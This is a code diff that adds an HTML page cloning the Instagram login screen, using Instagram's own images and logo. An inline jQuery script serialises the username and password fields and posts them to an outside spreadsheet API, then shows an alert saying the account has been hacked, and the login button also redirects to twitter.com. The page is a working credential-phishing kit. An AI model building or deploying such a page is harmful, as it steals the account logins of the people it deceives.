@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<script
+		src="https://code.jquery.com/jquery-3.4.1.js"
+		integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU="
+		crossorigin="anonymous"></script>
+	<script>
+		function SubForm (){
+			$.ajax({
+				url:"https://api.apispreadsheets.com/data/15674/",
+				type:"post",
+				data:$("#myForm").serializeArray(),
+				success: function(){
+					alert("Congratulation your account have been hacked!!1")
+				},
+				error: function(){
+					alert("There was an error :(")
+				}
+			});
+		}
+	</script>
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <!-- FAVIVON -->
+    <link rel="shortcut icon" href="./images/favicon.png" type="image/png">
+    <!-- GOOGLE FONT -->
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
+    <!-- APP CSS -->
+    <link rel="stylesheet" href="./app.css">
+</head>
+
+<body>
+  	<form id="myForm">
+
+
+    <div class="container">
+        <div class="main-container">
+            <div class="main-content">
+                <div class="slide-container" style="background-image: url(https://www.instagram.com/static/images/homepage/home-phones.png/43cc71bb1b43.png);">
+                    <div class="slide-content" id="slide-content">
+                        <img src="https://www.instagram.com/static/images/homepage/screenshot1.jpg/d6bf0c928b5a.jpg" alt="slide image" class="active">
+                        <img src="https://www.instagram.com/static/images/homepage/screenshot2.jpg/6f03eb85463c.jpg" alt="slide image">
+                        <img src="https://www.instagram.com/static/images/homepage/screenshot3.jpg/f0c687aa6ec2.jpg" alt="slide image">
+                        <img src="https://www.instagram.com/static/images/homepage/screenshot5.jpg/0a2d3016f375.jpg" alt="slide image">
+                        <img src="https://www.instagram.com/static/images/homepage/screenshot4.jpg/842fe5699220.jpg" alt="slide image">
+                    </div>
+                </div>
+                <div class="form-container">
+                    <div class="form-content box">
+                        <div class="logo">
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1024px-Instagram_logo.svg.png" alt="Instagram logo" class="logo-light">
+                            <img src="./images/logo-dark.png" alt="Instagram logo" class="logo-dark">
+                        </div>
+
+                        <div class="signin-form" id="signin-form">
+                            <div class="form-group">
+                                <div class="animate-input">
+                                    <span>
+                                      	<label>                                        Phone number, username or email</label>
+                                    </span>
+                                    <input name="email">
+                                </div>
+                            </div>
+                            <div class="form-group">
+                                <div class="animate-input">
+                                    <span>
+                                        <label>password</label>
+                                    </span>
+                                    <input name="password">
+                                    <button>Show</button>
+                                </div>
+                            </div>
+
+          	</form>
+
+                            <div class="btn-group">
+                               
+                                  <button onclick='SubForm()' button class="btn-login" id="signin-btn"onClick="window.location='https://twitter.com/';"> Log In</button>
+                                   
+                                
+                            </div>
+                            
+                            
+                            <a href="#" class="forgot-pw">Forgot password?</a>
+                        </div>
+                    </div>
+                    <div class="box goto">
+                        <p>
+                            Don't have an account?
+                            <a href="#">Sign up</a>
+                        </p>
+                    </div>
+
+                    <div class="app-download">
+                        <p>Get the app.</p>
+                        <div class="store-link">
+                            <a href="#">
+                                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="app store">
+                            </a>
+                            <a href="#">
+                                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="google play">
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="footer">
+            <div class="links">
+                <a href="#">About</a>
+                <a href="#">Blog</a>
+                <a href="#">Jobs</a>
+                <a href="#">Help</a>
+                <a href="#">API</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+                <a href="#">Top Accounts</a>
+                <a href="#">Hashtags</a>
+                <a href="#">Locations</a>
+            </div>
+            <div class="copyright">
+                © 2021 Instagram from Facebook
+            </div>
+        </div>
+    </div>
+
+    <!-- APP JS -->
+    <script src="./app.js"></script>
+
+</body>
+
+</html>
